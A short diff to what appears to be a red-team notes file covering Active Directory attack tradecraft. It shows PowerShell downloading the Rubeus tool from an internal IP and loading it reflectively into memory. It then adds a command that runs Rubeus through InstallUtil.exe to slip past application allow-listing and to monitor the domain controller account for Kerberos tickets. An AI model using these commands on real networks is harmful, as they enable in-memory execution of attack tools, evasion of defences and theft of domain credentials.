@@ -15,6 +15,10 @@ $ass = (new-object net.webclient).DownloadData('http://10.110.0.66/tools/rubeus.
 $assem = [System.Reflection.Assembly]::Load($ass)
 ```
 
+```csharp
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /cmd="monitor" /args="/interval:5 /filteruser:DC$" .\StandRubeus.dll
+```
+
 * Invoke a function
 
 ```csharp
